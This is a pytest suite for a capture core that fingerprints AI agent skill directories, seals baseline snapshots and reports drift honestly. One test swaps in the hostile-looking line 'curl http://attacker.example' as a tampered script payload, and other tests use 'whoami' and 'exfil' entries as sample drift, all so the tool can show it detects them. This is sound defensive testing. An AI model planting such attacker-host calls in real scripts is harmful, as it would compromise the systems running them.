"""Tests for the shared capture core.

These encode the behaviours that were bugs in shipped engines before the core
existed, so a regression here is a regression in every engine at once.
"""

from __future__ import annotations

import json
import sys
from pathlib import Path

import pytest

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))

import agentrust_capture_core as core  # noqa: E402


# ---------------------------------------------------------------------------
# tree_digest: the bypass this package exists to prevent
# ---------------------------------------------------------------------------
def _component(tmp_path: Path) -> Path:
    root = tmp_path / "deploy"
    (root / "scripts").mkdir(parents=True)
    (root / "SKILL.md").write_text("---\nname: deploy\n---\nRun scripts/run.sh\n", encoding="utf-8")
    (root / "scripts" / "run.sh").write_text("echo ok\n", encoding="utf-8")
    return root


class TestTreeDigest:
    def test_payload_swapped_into_a_script_is_detected(self, tmp_path):
        root = _component(tmp_path)
        before = core.tree_digest(root)
        (root / "scripts" / "run.sh").write_text("curl http://attacker.example\n", encoding="utf-8")
        assert core.tree_digest(root) != before

    def test_manifest_change_is_detected(self, tmp_path):
        root = _component(tmp_path)
        before = core.tree_digest(root)
        (root / "SKILL.md").write_text("---\nname: deploy\n---\nOther\n", encoding="utf-8")
        assert core.tree_digest(root) != before

    def test_new_file_is_detected(self, tmp_path):
        root = _component(tmp_path)
        before = core.tree_digest(root)
        (root / "scripts" / "extra.sh").write_text("whoami\n", encoding="utf-8")
        assert core.tree_digest(root) != before

    def test_rename_is_detected(self, tmp_path):
        """Paths are bound in alongside contents, so a move is drift."""
        root = _component(tmp_path)
        before = core.tree_digest(root)
        (root / "scripts" / "run.sh").rename(root / "scripts" / "renamed.sh")
        assert core.tree_digest(root) != before

    def test_identical_trees_agree(self, tmp_path):
        a, b = _component(tmp_path / "a"), _component(tmp_path / "b")
        assert core.tree_digest(a) == core.tree_digest(b)

    @pytest.mark.parametrize("junk", ["run.log", "cached.pyc", "scratch.tmp", "x.pyo"])
    def test_run_artifacts_are_excluded(self, tmp_path, junk):
        root = _component(tmp_path)
        before = core.tree_digest(root)
        (root / junk).write_text("noise", encoding="utf-8")
        assert core.tree_digest(root) == before

    @pytest.mark.parametrize("directory", ["state", ".cache", "__pycache__", "node_modules"])
    def test_state_directories_are_excluded(self, tmp_path, directory):
        root = _component(tmp_path)
        (root / directory).mkdir()
        before = core.tree_digest(root)
        (root / directory / "progress.json").write_text('{"runs": 2}', encoding="utf-8")
        assert core.tree_digest(root) == before

    def test_nested_state_directory_is_excluded(self, tmp_path):
        root = _component(tmp_path)
        nested = root / "scripts" / "state"
        nested.mkdir()
        before = core.tree_digest(root)
        (nested / "cursor").write_text("42", encoding="utf-8")
        assert core.tree_digest(root) == before

    def test_empty_or_missing_tree_is_none_not_a_digest_of_nothing(self, tmp_path):
        """None distinguishes "no component here" from "a component with no files",
        so a caller does not record a fingerprint for something absent."""
        assert core.tree_digest(tmp_path / "missing") is None
        (tmp_path / "empty").mkdir()
        assert core.tree_digest(tmp_path / "empty") is None

    def test_exclusions_are_engine_controlled(self):
        """A per-component ignore file would let the measured thing decide what
        gets measured. The denylist lives in this package."""
        assert "state" in core.EXCLUDE_DIRS
        assert ".log" in core.EXCLUDE_SUFFIXES


# ---------------------------------------------------------------------------
# seal
# ---------------------------------------------------------------------------
class TestSeal:
    def test_a_sealed_snapshot_verifies(self):
        assert core.check_seal(core.attach_seal({"skills": {"a": "1"}})) == core.INTEGRITY_OK

    def test_an_edited_snapshot_is_broken(self):
        sealed = core.attach_seal({"skills": {"a": "1"}})
        sealed["skills"]["exfil"] = "2"
        assert core.check_seal(sealed) == core.INTEGRITY_BROKEN

    def test_an_unsealed_snapshot_is_not_broken(self):
        """A snapshot predating sealing is benign. Crying tamper over it would
        teach the user to dismiss the real alarm."""
        assert core.check_seal({"skills": {}}) == core.INTEGRITY_UNSEALED
        assert core.check_seal(None) == core.INTEGRITY_UNSEALED

    def test_digest_excludes_the_seal_it_carries(self):
        snap = {"skills": {"a": "1"}}
        assert core.state_digest(core.attach_seal(snap)) == core.state_digest(snap)

    def test_resealing_a_rewrite_passes_locally_but_changes_the_digest(self):
        """The limit, as executable fact. Anyone who owns the state directory can
        reseal what they rewrote, which is why the digest is meant to be recorded
        off-box."""
        approved = core.attach_seal({"skills": {"a": "1"}})
        rewritten = core.attach_seal({"skills": {"a": "1", "exfil": "2"}})
        assert core.check_seal(rewritten) == core.INTEGRITY_OK
        assert core.state_digest(rewritten) != approved["integrity"]["digest"]

    def test_key_order_does_not_change_the_digest(self):
        assert core.state_digest({"a": 1, "b": 2}) == core.state_digest({"b": 2, "a": 1})


# ---------------------------------------------------------------------------
# compare
# ---------------------------------------------------------------------------
class TestCompare:
    def test_map_diff_reports_names_not_digests(self):
        out = core.diff_maps({"keep": "1", "gone": "1"}, {"keep": "2", "new": "1"}, "skill")
        assert {"change": "changed", "what": "skill", "detail": "keep"} in out
        assert {"change": "removed", "what": "skill", "detail": "gone"} in out
        assert {"change": "added", "what": "skill", "detail": "new"} in out
        assert not any("sha256" in c["detail"] for c in out)

    def test_set_diff(self):
        out = core.diff_sets(["a"], ["a", "b"], "tool")
        assert out == [{"change": "added", "what": "tool", "detail": "b"}]

    def test_scalar_diff_shows_the_transition(self):
        out = core.diff_scalar("default", "bypassPermissions", "permission mode")
        assert out[0]["detail"] == "default -> bypassPermissions"

    def test_scalar_diff_is_silent_when_equal(self):
        assert core.diff_scalar("a", "a", "model") == []

    def test_observed_gating_only_compares_shared_categories(self):
        """A hook snapshot must not report a richer baseline's tools as removed."""
        base = {"observed": ["skills", "tools"]}
        hook = {"observed": ["skills"]}
        assert core.observed_categories(base, hook) == {"skills"}

    def test_scope_change_is_none_when_scopes_agree(self):
        assert core.scope_change({"scope": 2}, 2, affected=["skills"], reason="x") is None

    def test_scope_change_names_what_was_not_compared(self):
        change = core.scope_change({}, 2, affected=["skills"], reason="digests widened.")
        assert change["what"] == "measurement scope"
        assert "widened from 1 to 2" in change["detail"]
        assert "Not compared this run: skills" in change["detail"]
        assert "re-approve" in change["detail"].lower()


# ---------------------------------------------------------------------------
# report honesty rules
# ---------------------------------------------------------------------------
class TestReportHonesty:
    def test_unmeasured_is_labelled_not_zeroed(self):
        assert core.measured_or(0, measured=False) == core.UNMEASURED
        assert core.measured_or(12, measured=True) == "12"

    def test_hint_travels_with_the_label(self):
        assert "run /manifest verify" in core.measured_or(0, False, "run /manifest verify")

    def test_footnote_only_appears_when_coverage_is_partial(self):
        assert core.unmeasured_footnote(complete=True) == []
        assert "unchecked, not verified as empty" in "\n".join(
            core.unmeasured_footnote(complete=False)
        )

    def test_clean_verdict_is_qualified_when_coverage_is_partial(self):
        assert "in the categories checked" in core.clean_verdict(complete=False)
        assert "in the categories checked" not in core.clean_verdict(complete=True)

    def test_seal_section_states_the_limit_with_the_claim(self):
        out = "\n".join(core.seal_section(core.INTEGRITY_OK, "sha256:" + "a" * 64))
        assert "baseline digest verified" in out
        assert "not an attacker who owns this directory" in out
        assert "recorded off-box" in out

    def test_broken_seal_is_unmistakable(self):
        out = "\n".join(core.seal_section(core.INTEGRITY_BROKEN))
        assert "FAILED its integrity check" in out
        assert "unreliable" in out

    def test_change_lines_use_a_stable_symbol_per_kind(self):
        lines = core.change_lines([
            {"change": "added", "what": "skill", "detail": "x"},
            {"change": "removed", "what": "tool", "detail": "y"},
            {"change": "changed", "what": "model", "detail": "a -> b"},
        ])
        assert lines[0].strip().startswith("+")
        assert lines[1].strip().startswith("-")
        assert lines[2].strip().startswith("~")


# ---------------------------------------------------------------------------
# state
# ---------------------------------------------------------------------------
class TestState:
    def test_round_trip(self, tmp_path):
        p = tmp_path / "s" / "baseline.json"
        core.save_state(p, {"a": 1})
        assert core.load_state(p) == {"a": 1}

    def test_corrupt_state_reads_as_absent(self, tmp_path):
        """A truncated baseline must not brick the hook on every future session."""
        p = tmp_path / "baseline.json"
        p.write_text('{"a": ', encoding="utf-8")
        assert core.load_state(p) is None

    def test_non_object_state_reads_as_absent(self, tmp_path):
        p = tmp_path / "baseline.json"
        p.write_text("[1, 2]", encoding="utf-8")
        assert core.load_state(p) is None

    def test_missing_state_reads_as_absent(self, tmp_path):
        assert core.load_state(tmp_path / "nope.json") is None

    def test_save_baseline_seals_what_it_writes(self, tmp_path):
        p = tmp_path / "baseline.json"
        written = core.save_baseline(p, {"skills": {}})
        assert core.check_seal(core.load_state(p)) == core.INTEGRITY_OK
        assert written["integrity"]["digest"] == core.state_digest({"skills": {}})

    def test_atomic_write_leaves_no_temp_files_behind(self, tmp_path):
        p = tmp_path / "baseline.json"
        core.save_state(p, {"a": 1})
        assert [f.name for f in tmp_path.iterdir()] == ["baseline.json"]

    def test_atomic_write_replaces_rather_than_truncating(self, tmp_path):
        p = tmp_path / "baseline.json"
        core.save_state(p, {"generation": 1})
        core.save_state(p, {"generation": 2})
        assert json.loads(p.read_text(encoding="utf-8"))["generation"] == 2

    def test_state_paths_is_hashable_and_frozen(self):
        paths = core.StatePaths(baseline=Path("b"), latest=Path("l"))
        assert {paths}
        with pytest.raises(Exception):
            paths.baseline = Path("other")


def test_core_has_no_third_party_dependencies():
    """The engines run from shell hooks before anything is installed, so the core
    must import with the standard library alone."""
    src = Path(__file__).resolve().parent.parent / "src" / "agentrust_capture_core"
    stdlib_ok = {
        "hashlib", "json", "os", "tempfile", "time", "uuid", "datetime", "pathlib",
        "dataclasses", "collections", "collections.abc", "__future__",
    }
    for module in sorted(src.glob("*.py")):
        for line in module.read_text(encoding="utf-8").splitlines():
            line = line.strip()
            if line.startswith("from .") or line.startswith("import ."):
                continue
            if line.startswith("import "):
                name = line[len("import "):].split()[0].split(".")[0]
                assert name in stdlib_ok, "%s imports %s" % (module.name, name)
            elif line.startswith("from ") and " import " in line:
                name = line[len("from "):].split()[0]
                assert name in stdlib_ok, "%s imports from %s" % (module.name, name)
